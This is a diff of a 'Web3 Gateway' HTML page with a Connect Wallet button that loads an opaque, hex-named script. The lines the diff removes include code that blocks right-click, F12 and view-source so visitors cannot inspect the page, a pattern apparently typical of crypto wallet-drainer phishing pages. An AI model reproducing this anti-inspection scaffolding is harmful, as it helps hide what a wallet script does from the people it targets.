@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
     <title>Web3 Gateway</title>
-
+    
+    <!-- Inline critical CSS -->
     <style>
       * {
         margin: 0;
@@ -38,8 +38,7 @@
         left: 0;
         width: 100%;
         height: 100%;
-        background: black url('./background_1.avif') no-repeat center center/cover;
-        will-change: transform;
+        background: black url('./background_1.webp') no-repeat center center/cover;
         z-index: 0;
       }
 
@@ -59,29 +58,10 @@
         cursor: pointer;
         font-weight: bold;
         transition: background 0.3s ease;
-        position: relative;
-      }
-
-      .open[disabled] {
-        opacity: 0.7;
-        cursor: not-allowed;
-      }
-
-      .loading-dots::after {
-        content: '...';
-        display: inline-block;
-        width: 1em;
-        animation: dots 1.4s infinite;
-      }
-
-      @keyframes dots {
-        0%, 20% { content: '.'; }
-        40% { content: '..'; }
-        60%, 100% { content: '...'; }
       }
 
       @media (hover: hover) {
-        .open:not([disabled]):hover {
+        .open:hover {
           background: #CCCCCC;
         }
       }
@@ -96,88 +76,22 @@
         }
       }
     </style>
-
+    
     <!-- Preload critical resources -->
-    <link rel="preload" href="./background_1.avif" as="image" type="image/avif">
-    <link rel="preload" href="./banner.avif" as="image" type="image/avif">
-    <link rel="preload" href="./fallback-background.jpg" as="image">
+    <link rel="preload" href="./background_1.webp" as="image">
+    <link rel="preload" href="./banner.webp" as="image">
   </head>
 
   <body>
     <header>
-      <picture>
-        <source srcset="./banner.avif" type="image/avif">
-        <source srcset="./banner.webp" type="image/webp">
-        <img src="./banner.png" alt="Site Logo" class="logo-banner" loading="eager" width="200" height="40">
-      </picture>
-      
-      <button class="open" aria-label="Connect Wallet" id="connectButton" disabled>
-        <span class="button-text">Connecting</span>
-        <span class="loading-dots" aria-hidden="true"></span>
-      </button>
+      <img src="./banner.webp" alt="Site Logo" class="logo-banner" loading="eager" width="200" height="40">
+      <button class="open" aria-label="Connect Wallet">Connect Wallet</button>
     </header>
 
     <div class="content-wrapper" role="main"></div>
 
-    <script>
-      // Anti-inspection measures
-      document.addEventListener('contextmenu', e => e.preventDefault());
-      document.addEventListener('keydown', e => {
-        if (
-          e.key === 'F12' ||
-          (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-          (e.ctrlKey && e.key === 'U')
-        ) {
-          e.preventDefault();
-        }
-      });
-
-      // WebGL fallback
-      (function checkWebGL() {
-        try {
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-          if (!gl) throw new Error('WebGL unavailable');
-        } catch (error) {
-          console.warn('WebGL Error:', error.message);
-          const wrapper = document.querySelector('.content-wrapper');
-          wrapper.style.backgroundImage = "url('./fallback-background.jpg')";
-        }
-      })();
-
-      // Web3 loader
-      (function loadWeb3() {
-        const script = document.createElement('script');
-        script.src = './67be024a7259dcef4dee5ce5.js';
-        script.crossOrigin = 'anonymous';
-        script.defer = true;
-        
-        const btn = document.getElementById('connectButton');
-        
-        script.onload = () => {
-          btn.disabled = false;
-          btn.querySelector('.button-text').textContent = 'Connect Wallet';
-          btn.querySelector('.loading-dots').style.display = 'none';
-        };
-
-        
-        
-        script.onerror = () => {
-          console.error('Web3 script failed to load');
-          btn.disabled = true;
-          btn.querySelector('.button-text').textContent = 'Connection Failed';
-          btn.querySelector('.loading-dots').style.display = 'none';
-        };
-
-        document.head.appendChild(script);
-      })();
-    </script>
-
-    <noscript>
-      <style>header { display: none !important; }</style>
-      <div class="noscript-warning">
-        JavaScript is required to use this application. Please enable JavaScript in your browser settings.
-      </div>
-    </noscript>
+    <!-- Async script loading with fallback -->
+    <script src="./67be024a7259dcef4dee5ce5.js" defer></script>
+    <noscript>Please enable JavaScript to use this application</noscript>
   </body>
 </html>
